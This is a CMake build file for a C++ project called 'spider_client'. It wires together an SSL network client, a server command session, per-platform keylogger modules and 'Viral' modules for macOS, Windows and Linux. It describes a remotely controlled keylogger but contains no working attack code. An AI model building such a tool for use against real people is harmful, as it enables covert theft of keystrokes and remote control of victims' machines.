cmake_minimum_required(VERSION 3.7)
project(spider_client)

##START CONFIG CMAKE
set(CMAKE_MODULE_PATH ${CMAKE_CURRENT_SOURCE_DIR}/vendor/core/cmake-utils/Module)
set(CMAKE_CONFIG_PATH ${CMAKE_CURRENT_SOURCE_DIR}/vendor/core/cmake-utils)

include(${CMAKE_CONFIG_PATH}/include.cmake)
add_subdirectory(vendor/core)
PROJECT_FOLDER(${PROJECT_NAME})
STANDARD_COMPILATION_SETTINGS()
BOOST_CONFIG_SPIDER_CLIENT()
OPENSSL_CONFIG()
find_package(Threads)
if (VERBOSE)
    PRINT_BUILD_TYPE()
    PRINT_FLAGS_INFO()
endif ()
enable_testing()
include(CTest)

include_directories(Project)
include_directories(vendor/core/Project/core-utils/project)
include_directories(vendor/core/Project/core-network/project)

set(HEADERS_SPIDER_NETWORK
        Project/Network/IOManager.hpp
        Project/Network/ClientSession.hpp
        Project/Network/SSLContext.hpp
        Project/Network/SSLConnection.hpp
        Project/Network/ErrorCode.hpp
        Project/Network/TCPAcceptor.hpp
        Project/Network/BufferView.hpp
        Project/Network/Timer.hpp)

set(HEADERS_SPIDER_PROTOCOL
        Project/Protocol/CommandHandler.hpp
        Project/Protocol/MessagesEnums.hpp
        Project/Protocol/Messages.hpp)

set(HEADERS_SPIDER_KEYLOGGER
        Project/KeyLogger/KeyLogger.hpp
        Project/KeyLogger/KeyLoggerFactory.hpp
        Project/Viral/Viral.hpp)

set(HEADERS_SPIDER_LOGGING
        Project/Logging/LogHandle.hpp
        Project/Logging/AbstractLogHandle.hpp)

set(HEADERS_SPIDER_UTILS
        Project/Utils/ILoggable.hpp
        Project/Utils/Serialization.hpp
        Project/Utils/Stringification.hpp
        )

set(HEADERS_SPIDER_CORE
        Project/Core/CommandableSession.hpp
        Project/Core/ServerCommandSession.hpp
        Project/Core/CSpiderCore.hpp
        )

set(HEADERS_SPIDER
        ${HEADERS_SPIDER_NETWORK}
        ${HEADERS_SPIDER_PROTOCOL}
        ${HEADERS_SPIDER_KEYLOGGER}
        ${HEADERS_SPIDER_LOGGING}
        ${HEADERS_SPIDER_UTILS}
        ${HEADERS_SPIDER_CORE}
        Project/Configuration.hpp)

if (APPLE)
    set(HEADERS_SPIDER ${HEADERS_SPIDER}
            Project/KeyLogger/details/OSXKeyLogger.hpp
            )
    set(HEADERS_SPIDER ${HEADERS_SPIDER} Project/Viral/details/OSXViral.hpp)
elseif (WIN32)
    set(HEADERS_SPIDER ${HEADERS_SPIDER} Project/KeyLogger/details/WinKeyLogger.hpp)
    set(HEADERS_SPIDER ${HEADERS_SPIDER} Project/Viral/details/WindowsViral.hpp)
elseif (LINUX)
    set(HEADERS_SPIDER ${HEADERS_SPIDER} Project/KeyLogger/details/LinuxKeyLogger.hpp)
    set(HEADERS_SPIDER ${HEADERS_SPIDER} Project/Viral/details/LinuxViral.hpp)
endif ()

set(SOURCES_SPIDER Project/main.cpp)

add_executable(${PROJECT_NAME} ${SOURCES_SPIDER} ${HEADERS_SPIDER})

if (APPLE)
    FIND_LIBRARY(APP_SERVICES_LIBRARY ApplicationServices)
    target_link_libraries(${PROJECT_NAME} PUBLIC core-utils core-log core-config core-net ${Boost_LIBRARIES} ${OPENSSL_LIBRARIES} ${CMAKE_THREAD_LIBS_INIT} ${APP_SERVICES_LIBRARY})
else ()
    target_link_libraries(${PROJECT_NAME} PUBLIC core-utils core-log core-config core-net PRIVATE ${Boost_LIBRARIES} ${CMAKE_THREAD_LIBS_INIT})
endif ()

if (WIN32)
    target_compile_definitions(${PROJECT_NAME} PRIVATE WIN32_LEAN_AND_MEAN)
endif (WIN32)

#add_subdirectory(test)
